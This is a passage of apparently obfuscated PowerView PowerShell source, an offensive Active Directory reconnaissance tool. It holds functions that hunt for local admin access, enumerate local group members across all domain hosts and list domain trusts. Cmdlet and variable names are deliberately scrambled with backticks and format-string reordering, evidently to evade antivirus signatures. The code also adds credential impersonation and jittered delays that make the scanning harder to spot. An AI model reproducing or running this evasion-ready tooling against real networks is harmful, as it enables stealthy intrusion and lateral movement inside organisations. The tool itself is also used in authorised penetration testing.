                        ${taRG`ETc`O`mPuTer}
                    }
                }
            }

            if (${tOK`eNhaNd`Le}) {
                &("{2}{4}{1}{3}{0}"-f'ToSelf','e-R','Invo','evert','k')
            }
        }

        ${L`ogO`NTok`en} = ${n`UlL}
        if (${ps`B`O`UNd`pArAme`TeRS}['Credential']) {
            if (${pSBo`UN`DpaRam`Et`erS}['Delay'] -or ${PsBOun`DPA`R`AMETeRS}['StopOnSuccess']) {
                ${LO`GonT`o`KeN} = &("{2}{3}{1}{5}{0}{4}" -f'atio','p','Invoke-Use','rIm','n','erson') -Credential ${cR`Ed`EnTiaL}
            }
            else {
                ${lOgO`N`ToKEN} = &("{3}{6}{1}{0}{5}{2}{4}"-f 'UserImperso','e-','tio','In','n','na','vok') -Credential ${CREd`E`NtIaL} -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${Ps`BoUndPAr`A`mET`eRS}['Delay'] -or ${P`SBoUn`dPAR`A`MetErS}['StopOnSuccess']) {

            &("{0}{1}{3}{2}" -f 'Wr','ite-V','ose','erb') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            &("{1}{0}{3}{2}"-f 'rite-V','W','bose','er') "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            ${CoUN`TeR} = 0
            ${R`An`dnO} = &("{0}{2}{1}" -f'New-','t','Objec') ("{2}{3}{1}{4}{0}"-f 'dom','.','Sy','stem','Ran')

            ForEach (${TA`R`GEt`COmput`eR} in ${taRG`EtcomP`Ute`Rs}) {
                ${cOU`NtEr} = ${c`Ou`NTEr} + 1

                # sleep for our semi-randomized interval
                &("{1}{0}{2}"-f 'rt-Sle','Sta','ep') -Seconds ${ran`D`No}.Next((1-${Ji`TTeR})*${DE`Lay}, (1+${Jit`Ter})*${D`El`Ay})

                &("{1}{3}{0}{2}" -f 'o','Write-Ver','se','b') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                &("{0}{1}{3}{2}" -f'Inv','ok','Command','e-') -ScriptBlock ${HO`stENuM`B`L`ock} -ArgumentList ${tar`GeT`CO`mp`UTER}, ${LoGo`N`T`oKen}
            }
        }
        else {
            &("{1}{2}{0}" -f 'Verbose','Wri','te-') "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${sCrI`pTPA`RAMs} = @{
                'TokenHandle' = ${lOgon`Tok`en}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{0}{2}{1}{3}"-f'Ne','Thread','w-','edFunction') -ComputerName ${TAr`GEtCoM`p`Ute`RS} -ScriptBlock ${h`OS`T`enumbL`ocK} -ScriptParameters ${ScriPT`pA`R`A`ms} -Threads ${THRea`dS}
        }
    }
}


function FInD-Do`maINLOc`A`LGRouPmEm`BER {
<#
.SYNOPSIS

Enumerates the members of specified local group (default administrators)
for all the targeted machines on the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the members of the specified local
group (default of Administrators) for each machine using Get-NetLocalGroupMember.
By default, the API method is used, but this can be modified with '-Method winnt'
to use the WinNT service provider.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainLocalGroupMember

Enumerates the local group memberships for all reachable machines in the current domain.

.EXAMPLE

Find-DomainLocalGroupMember -Domain dev.testlab.local

Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential $Cred

Enumerates the local group memberships for all reachable machines the dev.testlab.local
domain using the alternate credentials.

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('DNSHostName')]
        [String[]]
        ${Co`MpuTeRN`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`M`pUT`erDOMAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOmpUTErL`DAPFi`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPu`TEr`SeaRCH`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${Co`mpUt`eRO`p`er`AtIN`gsyStEM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${Comput`er`SEr`V`IceP`AcK},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${c`omp`UTeRSitEn`AmE},

        [Parameter(ValueFromPipelineByPropertyName = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${GroU`p`NamE} = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${meT`h`od} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sE`ArCHSc`oPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rESU`ltPAG`EsI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`ertImEL`IMIT},

        [Switch]
        ${T`Om`BSToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREde`NTi`AL} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${De`LaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Jit`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tH`Rea`ds} = 20
    )

    BEGIN {
        ${C`OM`PuTeRsEaRChErArG`Um`EnTS} = @{
            'Properties' = 'dnshostname'
        }
        if (${pSBOU`Ndpar`AMEte`Rs}['ComputerDomain']) { ${Co`MpUteR`Se`AR`CHERA`RGuME`N`TS}['Domain'] = ${c`o`MP`UTerd`omAIN} }
        if (${psb`ouNd`Par`AMe`TErs}['ComputerLDAPFilter']) { ${cOmPUt`erSE`AR`c`H`eR`ArgUMenTs}['LDAPFilter'] = ${compUT`erLDA`P`Fi`LtEr} }
        if (${pSbOU`ND`PA`R`A`MeTeRS}['ComputerSearchBase']) { ${coMP`UTerseaRcH`e`R`ARGUmenTS}['SearchBase'] = ${cO`m`pUteRSeA`RcHbaSe} }
        if (${pSB`OunDPa`Ra`MEt`ers}['Unconstrained']) { ${Co`Mpu`TER`SeA`RcherA`RgumeNtS}['Unconstrained'] = ${UNco`N`sTRAinED} }
        if (${P`SbouN`dpa`RA`Me`TeRs}['ComputerOperatingSystem']) { ${Co`MputERs`E`ARc`HEraRg`U`MeNTs}['OperatingSystem'] = ${op`e`R`AtiNGsYSTem} }
        if (${pSbo`U`Nd`pAram`eTerS}['ComputerServicePack']) { ${CoM`pUTEr`s`EARC`H`erar`Gu`mEn`TS}['ServicePack'] = ${SERV`IcepA`ck} }
        if (${ps`BOun`D`paRaM`ET`ERs}['ComputerSiteName']) { ${cOmp`UT`ERseaRCHErA`RguMEn`TS}['SiteName'] = ${sI`TeNa`Me} }
        if (${PsbOu`Ndp`A`RAMeTeRs}['Server']) { ${cOmPuteRSE`Ar`CherA`RG`UmE`N`Ts}['Server'] = ${se`R`VER} }
        if (${psBOUNd`pARAm`E`TE`Rs}['SearchScope']) { ${COMpuTer`s`Ea`RCHerargu`m`EN`TS}['SearchScope'] = ${SeARch`Sc`O`pe} }
        if (${psboU`N`D`pAramEteRs}['ResultPageSize']) { ${co`mPuTErSEArC`He`R`AR`GUMEN`TS}['ResultPageSize'] = ${rESU`lt`p`Ag`esIZE} }
        if (${pS`B`O`UnDpaR`Ame`TeRs}['ServerTimeLimit']) { ${c`o`mpUtERsEa`R`ChERa`RGuMe`Nts}['ServerTimeLimit'] = ${SErv`ERTIM`ELimIT} }
        if (${pS`BoU`Ndp`A`RAM`eteRS}['Tombstone']) { ${COmP`UteRseARche`RARGU`ME`NtS}['Tombstone'] = ${T`OmB`st`ONe} }
        if (${pSb`ounDp`ARamEt`eRS}['Credential']) { ${CoMpuTER`sEa`RC`he`RArGU`m`enTS}['Credential'] = ${c`REdEnt`iAL} }

        if (${pSBOUNDp`A`Ra`m`et`erS}['ComputerName']) {
            ${ta`RGeTCO`m`pu`TERs} = ${coMp`UTe`Rn`A`Me}
        }
        else {
            &("{3}{2}{1}{0}"-f'e','os','rite-Verb','W') '[Find-DomainLocalGroupMember] Querying computers in the domain'
            ${t`ArgeTcOm`PU`TERs} = &("{0}{2}{3}{1}{5}{4}" -f 'Get-','ainC','D','om','puter','om') @ComputerSearcherArguments | &("{3}{2}{0}{1}" -f'j','ect','Ob','Select-') -ExpandProperty ("{0}{2}{1}{3}"-f 'dns','os','h','tname')
        }
        &("{0}{2}{1}" -f 'Writ','e','e-Verbos') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if (${TargETcOmP`Ut`E`Rs}.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        ${hOs`T`enumBLOcK} = {
            Param(${C`Om`pUTer`NAMe}, ${g`ROUP`NaMe}, ${me`ThOD}, ${ToKEnh`AnD`LE})

            # Add check if user defaults to/selects "Administrators"
            if (${Gr`o`U`pnamE} -eq "Administrators") {
                ${ADMiNS`e`CuR`itYIDEn`TifIer} = &("{1}{2}{0}" -f'ject','New-O','b') ("{0}{5}{6}{1}{7}{2}{9}{8}{4}{3}" -f'S','ecu','.Principal.Se','ntifier','e','yst','em.S','rity','tyId','curi')([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,${nu`LL})
                ${GRo`UPNA`mE} = (${A`d`mIN`SECU`RITyi`DEn`TiFIer}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if (${T`okeN`HA`NDle}) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                ${nU`LL} = &("{6}{2}{4}{1}{3}{5}{0}" -f'on','oke-Us','n','erImp','v','ersonati','I') -TokenHandle ${TOK`Enhan`D`lE} -Quiet
            }

            ForEach (${tarGe`TCOm`p`Ut`er} in ${CO`Mpu`Ter`Name}) {
                ${u`p} = &("{0}{4}{3}{1}{2}" -f'Test','nect','ion','Con','-') -Count 1 -Quiet -ComputerName ${Ta`RGEt`cO`M`pUtER}
                if (${Up}) {
                    ${nEtLoCa`lGR`ou`pmeMB`e`RARGuMeN`Ts} = @{
                        'ComputerName' = ${T`A`RgEtComPu`TeR}
                        'Method' = ${m`EThod}
                        'GroupName' = ${g`ROu`pNAME}
                    }
                    &("{3}{2}{0}{1}" -f 'tLocal','GroupMember','-Ne','Get') @NetLocalGroupMemberArguments
                }
            }

            if (${t`Okenhand`lE}) {
                &("{3}{0}{2}{1}"-f'rt','oSelf','T','Invoke-Reve')
            }
        }

        ${LogON`TOk`en} = ${nu`ll}
        if (${PsBO`U`Nd`PARaM`e`TERs}['Credential']) {
            if (${pSb`oU`Nd`p`ArameteRS}['Delay'] -or ${Psb`OU`NdPAR`Amet`Ers}['StopOnSuccess']) {
                ${LogO`NTO`kEN} = &("{1}{4}{3}{0}{2}" -f 'nati','Invok','on','perso','e-UserIm') -Credential ${C`ReDEnT`iAl}
            }
            else {
                ${L`oG`ontOkEn} = &("{2}{1}{4}{3}{0}{5}"-f 'sonat','-','Invoke','mper','UserI','ion') -Credential ${c`RedE`Nt`IAL} -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${ps`B`OunDp`AR`AMeTE`Rs}['Delay'] -or ${PS`BOU`N`dpaRame`T`eRS}['StopOnSuccess']) {

            &("{0}{1}{2}"-f'Write-Ver','bos','e') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            &("{0}{3}{1}{4}{2}"-f 'Write-V','rb','se','e','o') "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            ${cOU`Nt`Er} = 0
            ${ran`D`No} = &("{2}{0}{1}" -f 'w','-Object','Ne') ("{0}{3}{1}{2}"-f'Sy','em.Ran','dom','st')

            ForEach (${TA`Rg`etCOm`pUTEr} in ${tarGe`TComPute`Rs}) {
                ${cO`U`NtEr} = ${cO`U`NTer} + 1

                # sleep for our semi-randomized interval
                &("{2}{1}{3}{0}"-f 'eep','tart-','S','Sl') -Seconds ${RaN`d`No}.Next((1-${JI`TtER})*${de`L`Ay}, (1+${j`I`TTER})*${D`eL`Ay})

                &("{1}{0}{3}{2}"-f'te-','Wri','bose','Ver') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                &("{0}{2}{1}{3}"-f'Inv','e-','ok','Command') -ScriptBlock ${hOSTE`NUM`B`lOck} -ArgumentList ${T`ARgEtc`O`mPUTer}, ${gRO`U`P`NamE}, ${Me`Thod}, ${LoGo`NTok`en}
            }
        }
        else {
            &("{2}{1}{3}{0}"-f'e','r','W','ite-Verbos') "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${s`cRipT`Pa`RAms} = @{
                'GroupName' = ${groUp`N`Ame}
                'Method' = ${m`etH`od}
                'TokenHandle' = ${lOg`oNT`oK`en}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{3}{4}{0}{2}{1}" -f 'Fu','ction','n','New-Thr','eaded') -ComputerName ${T`A`RGet`cOmpu`TeRs} -ScriptBlock ${HosTEnUmb`lo`ck} -ScriptParameters ${s`criP`TPA`RaMs} -Threads ${thr`E`ADS}
        }
    }

    END {
        if (${lo`g`OnToKeN}) {
            &("{3}{5}{2}{1}{0}{4}" -f 'T','-Revert','e','In','oSelf','vok') -TokenHandle ${l`og`o`NTOkEn}
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Ge`T-DOmAin`T`Ru`sT {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .LDAP methods.

.EXAMPLE

Get-DomainTrust -NET -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain using .NET methods

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrust -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred

Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMA`IN},

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        ${A`pI},

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        ${n`ET},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`Da`pF`IlteR},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRo`PErT`ieS},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`ARC`Hb`Ase},

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${se`RV`eR},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`Ar`chSc`OpE} = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${ReSUlTPA`gE`S`izE} = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRvERT`imeL`iM`It},

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        ${Tomb`s`TOne},

        [Alias('ReturnOne')]
        [Switch]
        ${FIn`d`ONE},

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`Ent`Ial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${TRusT`A`Tt`RIB`Utes} = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        ${ld`APS`eAr`cherarGuM`e`NTS} = @{}
        if (${pSBo`U`NdparA`MeTeRs}['Domain']) { ${ldAPsEaRcheR`A`R`g`UmE`Nts}['Domain'] = ${do`m`AiN} }
        if (${psboU`Ndp`AR`AMeTErS}['LDAPFilter']) { ${ldA`PSear`ch`E`RaRG`U`menTs}['LDAPFilter'] = ${L`DA`pFiLter} }
        if (${PsBo`UnDPARAM`E`TeRS}['Properties']) { ${LDAP`SE`ARcHE`R`ArGu`men`Ts}['Properties'] = ${PROpE`RTi`ES} }
        if (${PsBoun`dPa`R`A`mEteRS}['SearchBase']) { ${l`d`APs`eArcHER`ARgUM`e`NtS}['SearchBase'] = ${S`eaRcHB`ASe} }
        if (${Psb`ouN`dp`ArAmeters}['Server']) { ${l`DApseARC`hERa`RGumen`Ts}['Server'] = ${SeR`VEr} }
        if (${Ps`B`OUn`DpaRaMeT`Ers}['SearchScope']) { ${l`dapsE`A`Rc`HeRA`RguM`EnTS}['SearchScope'] = ${SE`ARCH`S`Cope} }
        if (${pSBOuN`Dpa`Ram`Et`ers}['ResultPageSize']) { ${ldaPSea`RcH`erARgU`ME`Nts}['ResultPageSize'] = ${R`e`SultpaGE`siZe} }
        if (${PS`B`o`UnDpARAMeTers}['ServerTimeLimit']) { ${l`da`psEaR`CHERArGu`mEnts}['ServerTimeLimit'] = ${SeR`V`eRtIMe`LIm`IT} }
        if (${ps`B`Ou`NDp`ARAMeters}['Tombstone']) { ${LdapsEar`C`He`Ra`RgumenTs}['Tombstone'] = ${toMB`st`oNe} }
        if (${p`sbOuNdpARa`me`TERS}['Credential']) { ${L`DApSeARcHera`Rgu`mE`NTs}['Credential'] = ${CR`edentI`AL} }
    }

    PROCESS {
        if (${P`S`CMdLEt}.ParameterSetName -ne 'API') {
            ${NEtSea`R`cH`ErA`Rgum`ents} = @{}
            if (${Do`MAIN} -and ${DOMA`In}.Trim() -ne '') {
                ${soUrC`eD`o`Main} = ${Do`MAIN}
            }
            else {
                if (${psB`Oun`DpAra`MeteRS}['Credential']) {
                    ${S`OuRc`EdO`MAiN} = (&("{0}{2}{1}"-f'G','-Domain','et') -Credential ${c`REDenti`Al}).Name
                }
                else {
                    ${SO`UR`C`eDOMain} = (&("{1}{2}{0}" -f'omain','Ge','t-D')).Name
                }
            }
        }
        elseif (${P`SCMdl`eT}.ParameterSetName -ne 'NET') {
            if (${D`oma`in} -and ${DOmA`iN}.Trim() -ne '') {
                ${S`OurceD`OMa`in} = ${do`Main}
            }
            else {
                ${sOURC`eDOmA`IN} = ${ENv:USerDNS`D`o`Main}
            }
        }

        if (${p`scm`dLet}.ParameterSetName -eq 'LDAP') {
            # if we're searching for domain trusts through LDAP/ADSI
            ${t`RustS`eArcHeR} = &("{3}{0}{1}{2}" -f'omainSe','a','rcher','Get-D') @LdapSearcherArguments
            ${S`OU`RC`ESID} = &("{2}{1}{0}"-f'D','SI','Get-Domain') @NetSearcherArguments

            if (${tRU`S`TSeaRcH`ER}) {

                ${T`RU`stse`ArcheR}.Filter = '(objectClass=trustedDomain)'

                if (${pSBOUN`dPA`RAM`E`TerS}['FindOne']) { ${REs`U`Lts} = ${tRUst`sEa`R`CHer}.FindOne() }
                else { ${R`EsulTs} = ${tru`S`Tse`ARcHER}.FindAll() }
                ${Res`U`lTs} | &("{0}{2}{1}"-f 'Wher','-Object','e') {${_}} | &("{0}{4}{2}{1}{3}" -f 'F','ec','bj','t','orEach-O') {
                    ${P`R`opS} = ${_}.Properties
                    ${dOmai`NtRU`St} = &("{3}{1}{0}{2}" -f'Obje','w-','ct','Ne') ("{0}{1}{2}"-f'P','SObjec','t')

                    ${TRUSt`AtT`R`Ib} = @()
                    ${tRust`AT`TRIB} += ${T`RuSTAT`T`RIB`UtES}.Keys | &("{2}{1}{3}{0}" -f '-Object','r','Whe','e') { ${prO`pS}.trustattributes[0] -band ${_} } | &("{1}{0}{3}{2}"-f'orEach','F','Object','-') { ${t`RuStAT`TRIb`UTeS}[${_}] }

                    ${DiR`eCtI`on} = Switch (${pRO`Ps}.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    ${T`RUSttY`Pe} = Switch (${pRo`PS}.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    ${DISTinGuI`S`HE`dNaME} = ${p`RO`pS}.distinguishedname[0]
                    ${SO`Urc`ENam`eiND`ex} = ${di`sTI`NgUiS`hE`dName}.IndexOf('DC=')
                    if (${sO`URCeN`AM`ein`deX}) {
                        ${s`O`URCEdoMAin} = $(${diST`I`NGUiSHedNa`mE}.SubString(${SOu`R`Cen`AMeI`NdEX})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${SoU`RC`EdOma`iN} = ""
                    }

                    ${targ`E`T`NameinDeX} = ${dISti`NG`UiSH`EDnaMe}.IndexOf(',CN=System')
                    if (${SOU`RcEnaM`e`INdex}) {
                        ${tArGeTD`OM`AIn} = ${DIsT`INguIS`h`ed`N`AME}.SubString(3, ${TaRg`etnam`Ei`N`dEx}-3)
                    }
                    else {
                        ${T`ArgETDO`M`AIN} = ""
                    }

                    ${OB`JEc`TgU`Id} = &("{0}{2}{1}" -f'Ne','ject','w-Ob') ("{0}{1}" -f 'Gui','d') @(,${p`R`OPS}.objectguid[0])
                    ${taR`gEtS`ID} = (&("{1}{2}{0}"-f'-Object','N','ew') ("{3}{1}{11}{9}{4}{10}{8}{2}{7}{6}{5}{0}" -f'ier','stem.Se','yIde','Sy','ncipa','if','t','n','t','.Pri','l.Securi','curity')(${P`RO`ps}.securityidentifier[0],0)).Value

                    ${Domai`NT`R`Ust} | &("{1}{2}{0}" -f'ber','A','dd-Mem') ("{1}{0}{2}"-f'tepr','No','operty') 'SourceName' ${s`oURCeD`om`AIN}
                    ${DO`m`AINtrUsT} | &("{0}{2}{1}"-f'Add-','er','Memb') ("{2}{1}{0}{3}" -f 'te','o','N','property') 'TargetName' ${PRo`Ps}.name[0]
                    # $DomainTrust | Add-Member Noteproperty 'TargetGuid' "{$ObjectGuid}"
                    ${dOm`AInT`Ru`sT} | &("{2}{3}{0}{1}" -f'd-Membe','r','A','d') ("{2}{1}{0}{3}"-f'eproper','ot','N','ty') 'TrustType' ${Trus`T`TYPe}
                    ${Do`MaINt`RU`st} | &("{1}{0}{2}"-f 'dd-Me','A','mber') ("{2}{0}{1}" -f'epropert','y','Not') 'TrustAttributes' $(${t`RU`STaTT`RiB} -join ',')
                    ${DOM`AiNtRU`St} | &("{3}{2}{0}{1}" -f'-M','ember','d','Ad') ("{1}{2}{0}"-f 'rty','Note','prope') 'TrustDirection' "$Direction"
                    ${dOmAiNTR`U`sT} | &("{2}{0}{1}" -f'dd-Memb','er','A') ("{1}{2}{0}{3}"-f'ope','Notep','r','rty') 'WhenCreated' ${pRO`pS}.whencreated[0]
                    ${dO`Ma`Intrust} | &("{1}{0}{2}" -f'Membe','Add-','r') ("{0}{2}{1}" -f 'No','rty','teprope') 'WhenChanged' ${pr`o`PS}.whenchanged[0]
                    ${dOm`AINtR`U`St}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    ${DOmaIn`Tr`UST}
                }
                if (${ReS`Ul`TS}) {
                    try { ${RE`SUL`TS}.dispose() }
                    catch {
                        &("{1}{2}{0}{3}"-f '-Verbo','Wri','te','se') "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                ${tRUsTs`earCh`ER}.dispose()
            }
        }
        elseif (${pscMDL`eT}.ParameterSetName -eq 'API') {
            # if we're searching for domain trusts through Win32 API functions
            if (${Ps`Bo`U`NDpAr`A`mEtERS}['Server']) {
                ${ta`R`GEtDc} = ${Se`R`VER}
            }
            elseif (${do`mAIn} -and ${d`Om`AIn}.Trim() -ne '') {
